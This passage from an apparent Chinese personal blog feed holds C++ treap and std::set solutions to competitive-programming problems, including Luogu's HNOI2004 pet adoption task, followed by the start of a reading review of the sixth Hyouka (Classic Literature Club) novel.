<span class="keyword">if</span>(<span class="built_in">isupper</span>(c))</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">srand</span>((<span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="type">int</span> Q,Min,x;</span><br><span class="line">        <span class="type">char</span> op;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;Q,&amp;Min);</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>,delta=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(Q--)</span><br><span class="line">        &#123;</span><br><span class="line">            op=<span class="built_in">getUpper</span>();</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">            <span class="keyword">switch</span>(op)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(x&lt;Min)<span class="keyword">break</span>;</span><br><span class="line">                    Node *p=<span class="built_in">newnode</span>(x-delta);</span><br><span class="line">                    <span class="built_in">insert</span>(root,p);</span><br><span class="line">                    <span class="built_in">treap</span>(p);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                    delta+=x;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    delta-=x;</span><br><span class="line">                    <span class="type">int</span> xtq=<span class="built_in">size</span>(root);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=xtq;i++)</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">kth</span>(root,<span class="number">1</span>)+delta&lt;Min)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">del</span>(<span class="built_in">find</span>(root,<span class="number">1</span>));</span><br><span class="line">                            ans++;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span>(x&gt;<span class="built_in">size</span>(root))<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,<span class="built_in">kth</span>(root,<span class="built_in">size</span>(root)-x+<span class="number">1</span>)+delta);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
            <tag> BST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3384 [HNOI2004]宠物收养场</title>
      <link href="/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20%5BHNOI2004%5D%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/"/>
      <url>/2018/04/09/%E6%B4%9B%E8%B0%B7P3384%20%5BHNOI2004%5D%E5%AE%A0%E7%89%A9%E6%94%B6%E5%85%BB%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href>https://www.luogu.org/problemnew/show/P3384</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一些序列<strong>（没有重复数字）</strong>，每个序列支持：<br>给定一些数k<strong>（对于每个序列不重复）</strong>，每次在序列里找到最接近k的数删除（如果有2个数字与k差一样，即分别是k-b和k+b，则选择较小的k-b），累加与k的差，输出。</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>其实关键就是维护一个有序序列，支持插入，查询前继后继，删除指定数字。<br>自然我们会想到手打平衡树，Treap&#x2F;Splay皆可。（这里只有旋转实现的Treap，非旋Treap（Split+Merge）和Splay日后加上）<br>Tips:为了防止越界等问题以及方便提取区间（尤其是Splay），序列前后一般塞上一个-INF和INF<br>然而作为C++选手，我们应该妙用STL。set可以实现这样的功能，内部是红黑树实现的也很快。</p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ol><li>旋转实现的Treap(160ms,3.03MB)<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF=<span class="number">1e9</span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">randad</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed=<span class="number">114514</span>;</span><br><span class="line">    <span class="keyword">return</span> seed=<span class="built_in">int</span>(seed*<span class="number">48271LL</span>%<span class="number">2147483647</span>);<span class="comment">//48271使得随机数有完全周期，即2147483647内取遍不重复 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> delta=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span> pri,val,ch[<span class="number">2</span>],size,tot;</span><br><span class="line"><span class="comment">//pri:Treap的随机数</span></span><br><span class="line"><span class="comment">//val:数字</span></span><br><span class="line"><span class="comment">//ch[0,1]:左孩子右孩子</span></span><br><span class="line"><span class="comment">//size:以该节点为根的子树里有几个数字</span></span><br><span class="line"><span class="comment">//tot:这个数字出现了几次（本题无用）</span></span><br><span class="line">&#125;T[<span class="number">111111</span>];</span><br><span class="line"><span class="type">int</span> k,size=<span class="number">0</span>,ANS,ans;<span class="comment">//k:根节点，size:树的大小,ANS:临时，ans:赶走了几个人</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> k)</span></span>&#123;T[k].size=T[T[k].ch[<span class="number">0</span>]].size+T[T[k].ch[<span class="number">1</span>]].size+T[k].tot;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rturn</span><span class="params">(<span class="type">int</span> &amp;k)</span><span class="comment">//右旋，把k旋到右边，k左孩子提到根</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t=T[k].ch[<span class="number">0</span>];</span><br><span class="line">    T[k].ch[<span class="number">0</span>]=T[t].ch[<span class="number">1</span>];</span><br><span class="line">    T[t].ch[<span class="number">1</span>]=k;</span><br><span class="line">    T[t].size=T[k].size;</span><br><span class="line">    <span class="built_in">update</span>(k);</span><br><span class="line">    k=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">lturn</span><span class="params">(<span class="type">int</span> &amp;k)</span><span class="comment">//左旋，把k旋到左边，k右孩子提到根</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t=T[k].ch[<span class="number">1</span>];</span><br><span class="line">    T[k].ch[<span class="number">1</span>]=T[t].ch[<span class="number">0</span>];</span><br><span class="line">    T[t].ch[<span class="number">0</span>]=k;</span><br><span class="line">    T[t].size=T[k].size;</span><br><span class="line">    <span class="built_in">update</span>(k);</span><br><span class="line">    k=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> val)</span> <span class="comment">//插入</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>) &#123;</span><br><span class="line">        size++;</span><br><span class="line">        k=size;</span><br><span class="line">        T[k].pri=<span class="built_in">randad</span>();</span><br><span class="line">        T[k].val=val;</span><br><span class="line">        T[k].size=T[k].tot=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    T[k].size++;</span><br><span class="line">    <span class="keyword">if</span> (T[k].val==val) T[k].tot++;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val&gt;T[k].val) &#123;</span><br><span class="line">        <span class="built_in">ins</span>(T[k].ch[<span class="number">1</span>],val);</span><br><span class="line">        <span class="keyword">if</span> (T[T[k].ch[<span class="number">1</span>]].pri&lt;T[k].pri) <span class="built_in">lturn</span>(k);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">ins</span>(T[k].ch[<span class="number">0</span>],val);</span><br><span class="line">        <span class="keyword">if</span> (T[T[k].ch[<span class="number">0</span>]].pri&lt;T[k].pri) <span class="built_in">rturn</span>(k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">del</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> val)</span><span class="comment">//删除值为val的数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>) <span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span> (T[k].val==val) &#123;</span><br><span class="line">        <span class="keyword">if</span> (T[k].tot&gt;<span class="number">1</span>) &#123;</span><br><span class="line">            T[k].tot--;</span><br><span class="line">            T[k].size--;</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (T[k].ch[<span class="number">0</span>]==<span class="number">0</span>||T[k].ch[<span class="number">1</span>]==<span class="number">0</span>) k=T[k].ch[<span class="number">0</span>]+T[k].ch[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(T[T[k].ch[<span class="number">0</span>]].pri&lt;T[T[k].ch[<span class="number">1</span>]].pri) <span class="built_in">rturn</span>(k),<span class="built_in">del</span>(k,val);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">lturn</span>(k),<span class="built_in">del</span>(k,val);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(val&gt;T[k].val) T[k].size--,<span class="built_in">del</span>(T[k].ch[<span class="number">1</span>],val);</span><br><span class="line">    <span class="keyword">else</span> T[k].size--,<span class="built_in">del</span>(T[k].ch[<span class="number">0</span>],val);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">xth</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> x)</span><span class="comment">//查询第x小的数是什么 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>||x==<span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=T[T[k].ch[<span class="number">0</span>]].size) <span class="keyword">return</span> <span class="built_in">xth</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(x&gt;T[T[k].ch[<span class="number">0</span>]].size+T[k].tot) <span class="keyword">return</span> <span class="built_in">xth</span>(T[k].ch[<span class="number">1</span>],x-T[T[k].ch[<span class="number">0</span>]].size-T[k].tot);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> T[k].val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> &amp;k,<span class="type">int</span> x)</span><span class="comment">//查询第x小数在树中位置 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k==<span class="number">0</span>||x==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=T[T[k].ch[<span class="number">0</span>]].size)<span class="keyword">return</span> <span class="built_in">find</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">if</span>(x==T[T[k].ch[<span class="number">0</span>]].size+<span class="number">1</span>)<span class="keyword">return</span> k;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">find</span>(T[k].ch[<span class="number">1</span>],x-T[T[k].ch[<span class="number">0</span>]].size<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pre</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> x)</span><span class="comment">//查询不比x大的且最接近x的数所在位置（x前继）</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(T[k].val&lt;x) ANS=k,<span class="built_in">pre</span>(T[k].ch[<span class="number">1</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">pre</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">next</span><span class="params">(<span class="type">int</span> k,<span class="type">int</span> x)</span><span class="comment">//查询不比x小的且最接近x的数所在位置（x后继）</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(T[k].val&gt;x) ANS=k,<span class="built_in">next</span>(T[k].ch[<span class="number">0</span>],x);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">next</span>(T[k].ch[<span class="number">1</span>],x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Catch</span><span class="params">(<span class="type">int</span> num)</span><span class="comment">//匹配宠物和饲养人</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">    <span class="built_in">pre</span>(k,num),a=T[ANS].val; </span><br><span class="line">    <span class="built_in">next</span>(k,num), b=T[ANS].val;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num-a&lt;=b-num &amp;&amp; a != -INF) &#123;</span><br><span class="line">            ans += num-a;</span><br><span class="line">            <span class="built_in">del</span>(k,a);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ans += b-num;</span><br><span class="line">            <span class="built_in">del</span>(k,b);</span><br><span class="line">        &#125;</span><br><span class="line">        ans %= <span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">        <span class="type">int</span> cur;</span><br><span class="line">        <span class="built_in">ins</span>(k,-INF),<span class="built_in">ins</span>(k,INF);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> a, b;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">            <span class="keyword">if</span>(T[k].size == <span class="number">2</span>) &#123;</span><br><span class="line">                cur=a;<span class="comment">//cur：当前是宠物等人认领还是人在等着接受宠物（看原题，不然谁看得懂啊= =）</span></span><br><span class="line">                <span class="built_in">ins</span>(k,b);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(a == cur) <span class="built_in">ins</span>(k,b);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">Catch</span>(b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line"><span class="number">2.</span> set实现(<span class="number">304</span>ms,<span class="number">2.57</span>MB)  </span><br><span class="line">```cpp</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">1111111</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">1000000000</span>;</span><br><span class="line"><span class="type">int</span> n, ans;</span><br><span class="line">set &lt;<span class="type">int</span>&gt; s;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt;::iterator left=--s.<span class="built_in">lower_bound</span>(x),right=s.<span class="built_in">lower_bound</span>(x);<span class="comment">//lower_bound的实现是二分查找，迭代器指向不比x小的且最接近x的数的位置，所以left就是前继，right就是后继</span></span><br><span class="line">    <span class="keyword">if</span>(x-*left&lt;=*right-x&amp;&amp;*left!=-INF) &#123;</span><br><span class="line">        ans+=x-*left;</span><br><span class="line">        s.<span class="built_in">erase</span>(left);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ans+=*right-x;</span><br><span class="line">        s.<span class="built_in">erase</span>(right);</span><br><span class="line">    &#125;</span><br><span class="line">    ans%=<span class="number">1000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="type">int</span> cur;</span><br><span class="line">    s.<span class="built_in">insert</span>(-INF),s.<span class="built_in">insert</span>(INF);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> a,b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="keyword">if</span>(s.<span class="built_in">size</span>()==<span class="number">2</span>) &#123;</span><br><span class="line">            cur=a;</span><br><span class="line">            s.<span class="built_in">insert</span>(b);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(a==cur) s.<span class="built_in">insert</span>(b);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">find</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
            <tag> Splay </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古籍研究社系列第6部《迟来的翅膀》读后感……吗？</title>
      <link href="/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/"/>
      <url>/2018/03/15/%E5%8F%A4%E7%B1%8D%E7%A0%94%E7%A9%B6%E7%A4%BE%E7%B3%BB%E5%88%97%E7%AC%AC6%E9%83%A8%E3%80%8A%E8%BF%9F%E6%9D%A5%E7%9A%84%E7%BF%85%E8%86%80%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F%E2%80%A6%E2%80%A6%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>准备看之前，我留意到这本书与前几本有些许不同。<br>英文的副标题消失了。封面的配图是天台，是一种生动明晰的色彩吧。天空与天台染上绿色调不知道为什么令我留意了许久。<br>主要还是封底的文字令我很在意：之前几本都只是在此抛出悬念&#x2F;疑问，令读者于书中找到答案，而这里却在后面附上了这样的文字：<br><strong>“全书分为六个短篇，在充满活力又带点苦涩的故事里，古籍研究社四名成员的过去和未来也逐渐明朗……”</strong><br>语气应该很平淡吧，但是仿佛一直在暗示我这一部不简单。这句话在试图传达着什么吗？已经确定了全书的基调吗？<br><strong>我很好奇。</strong>  </p><h3 id="故事1：《箱内的缺失》"><a href="#故事1：《箱内的缺失》" class="headerlink" title="故事1：《箱内的缺失》"></a>故事1：《箱内的缺失》</h3><p>案件本身不复杂。投票的票数比人数多，于是里志向折木求助。在2人的散步与对话中，真相逐渐浮出水面。回望同系列第5部《两人距离的概算》，全书用折木于“星谷杯”长跑中的思考串联，此处手法与其颇为相似。<br><strong>古籍研究社系列的故事往往不在案件本身。</strong><br>想想封底的话，不难猜到此处写的是里志的转变。第三部《库特利亚芙卡的顺序》中，里志总是念叨着“数据库是得不出结论的”这样的话。（顺带一提，第三部对四人的形象刻画很生动，个人很喜欢。）然而之所以一直念叨，想必也是因为本人不甘心——尽管那时里志也试着推理，不过他发现自己做不到。而在此，里志明显接受了自己没有折木那样的才能的事实，思想上已经做了转变，他依旧是那个在街机游戏中输了也笑得灿烂的里志。不过里志对公平正义的执着、对自己认为正确的事物的坚持从未改变。若非如此，他便不会为学弟打抱不平，便不会去请求折木解谜。变与不变，把里志形象刻画的极为鲜明。这个故事真正想要表达的是这样吧。</p><h3 id="故事2：《镜中不得见》"><a href="#故事2：《镜中不得见》" class="headerlink" title="故事2：《镜中不得见》"></a>故事2：《镜中不得见》</h3><p>用摩耶花的视角探寻折木的过去——有意思的视角。早已疑惑摩耶花之前为什么会讨厌折木，本篇则进行了解答，毕竟古籍研究社系列向来是重点在于案件背后。他的初中同学们会讨厌他仅仅是因为一次误会，而折木选择了沉默。在摩耶花的好奇心驱使下，终于了解了折木所作所为的原因。在摩耶花道歉之后，折木看似漫不经心，但是一句“折木的视线游移不定”的描写展现了他内心的深受触动。这一篇故事刻画了折木做好事不留名的“英雄”形象，其实也侧面反映了折木本身并不消极。折木骨子里和里志是一样的，千反田只是唤醒了他的激情。个人认为此文涉及到了校园欺凌，从旁观者的角度出发展现了校园“冷暴力”的可怕。旁观者不应旁观。若直接介入不妥，暗中帮助不失为一种好方法——米泽穗信也许想传达的是这个。<br>不得见的，真的在镜中吗？</p><h3 id="故事3：《群山已放晴？》"><a href="#故事3：《群山已放晴？》" class="headerlink" title="故事3：《群山已放晴？》"></a>故事3：《群山已放晴？》</h3><p>折木探明了实际上不喜欢直升机的老师在某日早晨说出“我喜欢直升机”的缘由。看到一半的时候其实大部分人便都能模模糊糊猜到缘由了。当然重点依旧不在案件上。<br><strong>折木说出“我很好奇”</strong>的时候，无论里志、千反田、摩耶花还是读者都会大吃一惊吧。这则故事不长，像是一种过渡。然而说到过渡就会想到转变——节能主义的折木开始渴望本书中所说的“玫瑰色的人生”。某种程度上，折木已经放弃了节能主义。千反田是引子，根本动力是同里志一样的、内心深处对某些东西的执着和渴望。<br>我相信里志在整个系列中更像是折木的真我之体现。通过两人表现的差异，便能看出折木距离真正的自我还有多远。这是我对里志的理解：折木内心的镜像。</p><h3 id="故事4：《我们的传说之书》"><a href="#故事4：《我们的传说之书》" class="headerlink" 